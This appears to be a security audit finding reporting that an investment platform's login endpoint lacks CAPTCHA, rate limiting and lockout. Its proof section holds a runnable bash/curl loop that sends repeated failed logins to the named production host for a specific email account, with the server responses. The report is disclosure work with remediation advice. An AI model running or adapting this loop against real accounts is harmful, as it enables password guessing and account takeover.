# F030 - No Brute Force Protection on Login Endpoint

## Summary

| Field | Value |
|-------|-------|
| Severity | High |
| CVSS 3.1 | 7.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Endpoint | POST https://investor-auth.spiko.io/self-service/login?flow={id} |
| Status | Confirmed |

## Description

The login endpoint has no effective brute force protection:

1. No CAPTCHA on login flow (registration requires captcha_token, but login does not)
2. No rate limiting: 20 rapid failed login attempts all accepted without 429 responses
3. No per-account lockout: After 20+ failed attempts, the account is not locked
4. No progressive delay: Response times remain constant regardless of failure count
5. Each login attempt requires a fresh flow ID, but flow creation is also unlimited

Combined with the timing-based account enumeration (F023), an attacker can:
1. Enumerate which emails have accounts (F023: ~12,000/hour)
2. Brute-force passwords on confirmed accounts without any barrier

## Proof

### 20 Rapid Failed Login Attempts

```bash
for i in $(seq 1 20); do
  FLOW=$(curl -s https://investor-auth.spiko.io/self-service/login/api | jq -r .id)
  curl -s -X POST "https://investor-auth.spiko.io/self-service/login?flow=$FLOW" \
    -H 'Content-Type: application/json' \
    -d '{"method":"password","identifier":"peter.bjorn75+spiko-prod1@gmail.com","password":"wrongpassword","transient_payload":{"captcha_token":"x"}}'
done
```

Result: All 20 attempts returned HTTP 400 (invalid credentials). Zero 429 responses. Zero lockout.

### Account Not Locked After Failed Attempts

After the 20 failed attempts, login with the correct password succeeded immediately:

```
POST /self-service/login?flow={id} HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{"method":"password","identifier":"peter.bjorn75+spiko-prod1@gmail.com","password":"[correct]","transient_payload":{"captcha_token":"x"}}
```

Response: HTTP 200, session_token returned.

### Rate Limit Headers

The rate limit headers claim `x-ratelimit-limit: 20, 20;w=1, 200;w=60` but no 429 responses were observed even at 20 requests per second.

## Impact

On a financial platform managing investment accounts:
- Password spraying attacks against investor accounts
- Credential stuffing with leaked credential lists
- Combined with F018 (CAPTCHA bypass), the entire authentication pipeline has no anti-automation
- Combined with F023 (timing oracle), targeted brute-force on confirmed accounts

## Remediation

1. Add CAPTCHA (Cloudflare Turnstile) to the login flow after N failed attempts
2. Implement per-account progressive delay (exponential backoff)
3. Lock accounts after N consecutive failed attempts with email notification
4. Enforce the declared rate limits (200/min is already generous for login)
